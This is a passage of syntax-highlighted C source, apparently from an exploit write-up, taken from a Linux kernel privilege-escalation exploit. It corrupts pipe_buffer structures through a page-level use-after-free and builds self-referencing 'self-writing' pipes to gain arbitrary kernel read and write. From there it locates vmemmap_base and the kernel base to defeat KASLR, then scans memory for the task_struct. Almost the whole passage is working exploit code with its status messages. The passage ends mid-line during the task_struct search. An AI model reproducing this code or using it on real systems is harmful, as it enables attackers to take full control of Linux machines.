pipe_buf[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">size_t</span> snd_pipe_sz = <span class="hljs-number">0x1000</span> * (SND_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m&quot;</span><br>         <span class="hljs-string">&quot;Stage III - corrupting second-level pipe_buffer to exploit a &quot;</span><br>         <span class="hljs-string">&quot;page-level UAF&quot;</span><br>         <span class="hljs-string">&quot;\033[0m\n&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>    <span class="hljs-comment">/* let the page&#x27;s ptr at pipe_buffer */</span><br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], buf, SND_PIPE_BUF_SZ*<span class="hljs-number">2</span> - <span class="hljs-number">24</span> - <span class="hljs-number">3</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><br>    <span class="hljs-comment">/* free orignal pipe&#x27;s page */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] free original pipe...&quot;</span>);<br>    close(pipe_fd[orig_pid][<span class="hljs-number">0</span>]);<br>    close(pipe_fd[orig_pid][<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-comment">/* try to rehit victim page by reallocating pipe_buffer */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fcntl() to set the pipe_buffer on victim page...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == victim_qidx) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, snd_pipe_sz) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* read victim page to check whether we&#x27;ve successfully hit it */</span><br>    <span class="hljs-built_in">memset</span>(pipe_buf, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-keyword">sizeof</span>(pipe_buf));<br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], buf, SND_PIPE_BUF_SZ - <span class="hljs-number">8</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], pipe_buf, <span class="hljs-number">40</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">40</span> / <span class="hljs-number">8</span>); i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[----data dump----][%d] %lx\n&quot;</span>, i, pipe_buf[i]);<br>    &#125;<br><br>    <span class="hljs-comment">/* I don&#x27;t know why but sometimes the read will be strange :( */</span><br>    <span class="hljs-keyword">if</span> (pipe_buf[<span class="hljs-number">4</span>] == <span class="hljs-number">0xffffffff</span>) &#123;<br>        <span class="hljs-built_in">memcpy</span>(&amp;info_pipe_buf, &amp;((<span class="hljs-type">char</span>*)pipe_buf)[<span class="hljs-number">12</span>], <span class="hljs-number">40</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">memcpy</span>(&amp;info_pipe_buf, pipe_buf, <span class="hljs-number">40</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;page: \033[0m%p\n&quot;</span> <br>           <span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;offset: \033[0m%x\n&quot;</span><br>           <span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;len: \033[0m%x\n&quot;</span><br>           <span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;ops: \033[0m%p\n&quot;</span><br>           <span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;flags: \033[0m%x\n&quot;</span><br>           <span class="hljs-string">&quot;\033[34m\033[1m[?] info_pipe_buf-&gt;private: \033[0m%lx\n&quot;</span>, <br>           info_pipe_buf.page, <br>           info_pipe_buf.offset, <br>           info_pipe_buf.len, <br>           info_pipe_buf.ops, <br>           info_pipe_buf.flags,<br>           info_pipe_buf.private);<br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">size_t</span>) info_pipe_buf.page &lt; <span class="hljs-number">0xffff000000000000</span><br>        || (<span class="hljs-type">size_t</span>) info_pipe_buf.ops &lt; <span class="hljs-number">0xffffffff81000000</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to re-hit victim page!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully to hit the UAF page!\033[0m&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got page leak:\033[0m %p\n&quot;</span>, info_pipe_buf.page);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br><br>    <span class="hljs-comment">/* construct a second-level page uaf */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] construct a second-level uaf pipe page...&quot;</span>);<br>    <span class="hljs-comment">//info_pipe_buf.offset = 8;</span><br>    <span class="hljs-comment">//info_pipe_buf.len = 0xf00;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">35</span>; i++) &#123;<br>        write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(info_pipe_buf));<br>        write(pipe_fd[victim_pid][<span class="hljs-number">1</span>],buf,SND_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(info_pipe_buf));<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-type">char</span> tmp_bf[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-type">int</span> nr;<br><br>        <span class="hljs-keyword">if</span> (i == victim_qidx) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(nr));<br>        <span class="hljs-keyword">if</span> (nr == <span class="hljs-number">0x74747261</span>) &#123;<br>            read(pipe_fd[i][<span class="hljs-number">0</span>], tmp_bf, <span class="hljs-number">4</span>);<br>            read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;nr, <span class="hljs-keyword">sizeof</span>(nr));<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] nr for %d pipe is %d\n&quot;</span>, i, nr);<br>        <span class="hljs-keyword">if</span> (nr &lt; PIPE_SPRAY_NR &amp;&amp; i != nr) &#123;<br>            snd_orig_pid = nr;<br>            snd_vicitm_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found second-level victim: \033[0m%d &quot;</span><br>                   <span class="hljs-string">&quot;\033[32m\033[1m, orig: \033[0m%d\n&quot;</span>, <br>                   snd_vicitm_pid, snd_orig_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (snd_vicitm_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to corrupt second-level pipe_buffer!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * VI - SECONDARY exploit stage: build pipe for arbitrary read &amp; write</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">building_self_writing_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">size_t</span> trd_pipe_sz = <span class="hljs-number">0x1000</span> * (TRD_PIPE_BUF_SZ/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer));<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">evil_pipe_buf</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page_ptr</span>;</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m&quot;</span><br>         <span class="hljs-string">&quot;Stage IV - Building a self-writing pipe system&quot;</span><br>         <span class="hljs-string">&quot;\033[0m\n&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>    <span class="hljs-comment">/* let the page&#x27;s ptr at pipe_buffer */</span><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="hljs-number">24</span> <span class="hljs-number">-3</span>*<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br><br>    <span class="hljs-comment">/* free orignal pipe&#x27;s page */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] free second-level original pipe...&quot;</span>);<br>    close(pipe_fd[snd_orig_pid][<span class="hljs-number">0</span>]);<br>    close(pipe_fd[snd_orig_pid][<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-comment">/* try to rehit victim page by reallocating pipe_buffer */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == victim_qidx) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* let a pipe-&gt;bufs pointing to itself */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 2nd pipe_buffer on page to itself...&quot;</span>);<br>    evil_pipe_buf.page = info_pipe_buf.page;<br>    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.ops = info_pipe_buf.ops;<br>    evil_pipe_buf.flags = info_pipe_buf.flags;<br>    evil_pipe_buf.private = info_pipe_buf.private;<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br><br>    <span class="hljs-comment">/* check for third-level victim pipe */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == victim_qidx) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>        <span class="hljs-keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;<br>            self_2nd_pipe_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found self-writing pipe: \033[0m%d\n&quot;</span>, <br>                    self_2nd_pipe_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (self_2nd_pipe_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* overwrite the 3rd pipe_buffer to this page too */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 3rd pipe_buffer on page to itself...&quot;</span>);<br>    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br><br>    <span class="hljs-comment">/* check for third-level victim pipe */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == victim_qidx) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid<br>            || i == self_2nd_pipe_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>        <span class="hljs-keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;<br>            self_3rd_pipe_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span><br>                    <span class="hljs-string">&quot;%d\n&quot;</span>, self_3rd_pipe_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (self_3rd_pipe_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* overwrite the 4th pipe_buffer to this page too */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking the 4th pipe_buffer on page to itself...&quot;</span>);<br>    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], &amp;evil_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_pipe_buf));<br><br>    <span class="hljs-comment">/* check for third-level victim pipe */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> (i == victim_qidx) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (i == orig_pid || i == victim_pid <br>            || i == snd_orig_pid || i == snd_vicitm_pid<br>            || i == self_2nd_pipe_pid || i== self_3rd_pipe_pid) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        read(pipe_fd[i][<span class="hljs-number">0</span>], &amp;page_ptr, <span class="hljs-keyword">sizeof</span>(page_ptr));<br>        <span class="hljs-keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;<br>            self_4th_pipe_pid = i;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span><br>                    <span class="hljs-string">&quot;%d\n&quot;</span>, self_4th_pipe_pid);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (self_4th_pipe_pid == <span class="hljs-number">-1</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to build a self-writing pipe!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> <span class="hljs-title">evil_2nd_buf</span>, <span class="hljs-title">evil_3rd_buf</span>, <span class="hljs-title">evil_4th_buf</span>;</span><br><span class="hljs-type">char</span> temp_zero_buf[<span class="hljs-number">0x1000</span>]= &#123; <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @brief Setting up 3 pipes for arbitrary read &amp; write.</span><br><span class="hljs-comment"> * We need to build a circle there for continuously memory seeking:</span><br><span class="hljs-comment"> * - 2nd pipe to search</span><br><span class="hljs-comment"> * - 3rd pipe to change 4th pipe</span><br><span class="hljs-comment"> * - 4th pipe to change 2nd and 3rd pipe</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">setup_evil_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* init the initial val for 2nd,3rd and 4th pipe, for recovering only */</span><br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_2nd_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_3rd_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br>    <span class="hljs-built_in">memcpy</span>(&amp;evil_4th_buf, &amp;info_pipe_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0xff0</span>;<br><br>    <span class="hljs-comment">/* hijack the 3rd pipe pointing to 4th */</span><br>    evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * <span class="hljs-number">3</span>;<br>    evil_3rd_buf.len = <span class="hljs-number">0</span>;<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    evil_4th_buf.offset = TRD_PIPE_BUF_SZ;<br>    evil_4th_buf.len = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_read_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page_to_read, <span class="hljs-type">void</span> *dst)</span><br>&#123;<br>    <span class="hljs-comment">/* page to read */</span><br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0xfff</span>;<br>    evil_2nd_buf.page = page_to_read;<br><br>    <span class="hljs-comment">/* hijack the 4th pipe pointing to 2nd pipe */</span><br>    write(pipe_fd[self_3rd_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_4th_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    <span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], <br>          temp_zero_buf, <br>          TRD_PIPE_BUF_SZ-<span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    <br>    <span class="hljs-comment">/* hijack the 3rd pipe to point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    <span class="hljs-comment">/* read out data */</span><br>    read(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">0</span>], dst, <span class="hljs-number">0xff0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_write_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page_to_write, <span class="hljs-type">void</span> *src, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>    <span class="hljs-comment">/* page to write */</span><br>    evil_2nd_buf.page = page_to_write;<br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* hijack the 4th pipe pointing to 2nd pipe */</span><br>    write(pipe_fd[self_3rd_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_4th_buf, <span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    <span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], <br>          temp_zero_buf, <br>          TRD_PIPE_BUF_SZ - <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    <br>    <span class="hljs-comment">/* hijack the 3rd pipe to point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], &amp;evil_3rd_buf, <span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    <span class="hljs-comment">/* write data into dst page */</span><br>    write(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">1</span>], src, len);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * VII - FINAL exploit stage with arbitrary read &amp; write</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">size_t</span> *tsk_buf, current_task_page, current_task, parent_task, buf[<span class="hljs-number">0x8000</span>];<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_leaking_by_arbitrary_pipe</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">size_t</span> *comm_addr;<br>    <span class="hljs-type">int</span> try_times;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m&quot;</span><br>         <span class="hljs-string">&quot;Stage V - Leaking info by arbitrary read &amp; write&quot;</span><br>         <span class="hljs-string">&quot;\033[0m\n&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Setting up kernel arbitrary read &amp; write...&quot;</span>);<br>    setup_evil_pipe();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * KASLR&#x27;s granularity is 256MB, and pages of size 0x1000000 is 1GB MEM,</span><br><span class="hljs-comment">     * so we can simply get the vmemmap_base like this in a SMALL-MEM env.</span><br><span class="hljs-comment">     * For MEM &gt; 1GB, we can just find the secondary_startup_64 func ptr,</span><br><span class="hljs-comment">     * which is located on physmem_base + 0x9d000, i.e., vmemmap_base[156] page.</span><br><span class="hljs-comment">     * If the func ptr is not there, just vmemmap_base -= 256MB and do it again.</span><br><span class="hljs-comment">     */</span><br>    vmemmap_base = (<span class="hljs-type">size_t</span>) info_pipe_buf.page &amp; <span class="hljs-number">0xfffffffff0000000</span>;<br>    try_times = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Checking whether the %lx is vmemmap_base..\n&quot;</span>,vmemmap_base);<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (vmemmap_base + <span class="hljs-number">157</span> * <span class="hljs-number">0x40</span>), buf);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[?] Get possible data: %lx\n&quot;</span>, buf[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] == <span class="hljs-number">0x2400000000</span>) &#123;<br>            err_exit(<span class="hljs-string">&quot;READING FAILED FOR UNKNOWN REASON!&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">0xffffffff81000000</span> &amp;&amp; ((buf[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xfff</span>) == <span class="hljs-number">0x030</span>)) &#123;<br>            kernel_base = buf[<span class="hljs-number">0</span>] -  <span class="hljs-number">0x030</span>;<br>            kernel_offset = kernel_base - <span class="hljs-number">0xffffffff81000000</span>;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n&quot;</span><br>                   <span class="hljs-string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n&quot;</span>, <br>                   kernel_base, kernel_offset);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        try_times++;<br>        <span class="hljs-keyword">if</span> (try_times == <span class="hljs-number">5</span>) &#123;<br>            vmemmap_base -= <span class="hljs-number">0x10000000</span>;<br>            try_times = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);<br><br>    <span class="hljs-comment">/* now seeking for the task_struct in kernel memory */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking task_struct in memory...&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * For a machine with MEM less than 256M, we can simply get the:</span><br><span class="hljs-comment">     *      page_offset_base = heap_leak &amp; 0xfffffffff0000000;</span><br><span class="hljs-comment">     * But that&#x27;s not always accurate, espacially on a machine with MEM &gt; 256M.</span><br><span class="hljs-comment">     * So we need to find another way to calculate the page_offset_base.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * Luckily the task_struct::ptraced points to itself, so we can get the</span><br><span class="hljs-comment">     * page_offset_base by vmmemap and current task_struct as we know the page.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     * Note that the offset of different filed should be referred to your env.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; <span class="hljs-number">1</span>; i++) &#123;<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (vmemmap_base + (i<span class="hljs-number">-1</span>)*<span class="hljs-number">0x40</span>), buf);<br>        arbitrary_read_by_pipe((<span class="hljs-keyword">struct</span> page*) (vmemmap_base + i * <span class="hljs-number">0x40</span>), <br>                               &amp;((<span class="hljs-type">char</span>*)buf)[<span class="hljs-number">0x1000</span>]);<br>    <br>        comm_addr = memmem(buf, <span class="hljs-number">0x1ff0</span>, <span class="hljs-string">&quot;arttPWNnba3&quot;</span>, <span class="hljs-number">11</span>);<br>        <span class="hljs-keyword">if</span> (comm_addr == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> ((((<span class="hljs-type">size_t</span>) comm_addr - (<span class="hljs-type">size_t</span>) buf) &amp; <span class="hljs-number">0xfff</span>) &lt; <span class="hljs-number">500</span>) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] Found string at page: %lx\n&quot;</span>, vmemmap_base + i * <span class="hljs-number">0x40</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] String offset: %lx\n&quot;</span>, <br>                                   ((<span class="hljs-type">size_t</span>) comm_addr - (<span class="hljs-type">size_t</span>) buf) &amp; <span class="hljs-number">0xfff</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] comm_addr[-2]: %lx\n&quot;</span>, comm_addr[<span class="hljs-number">-2</span>]);<br>        <span 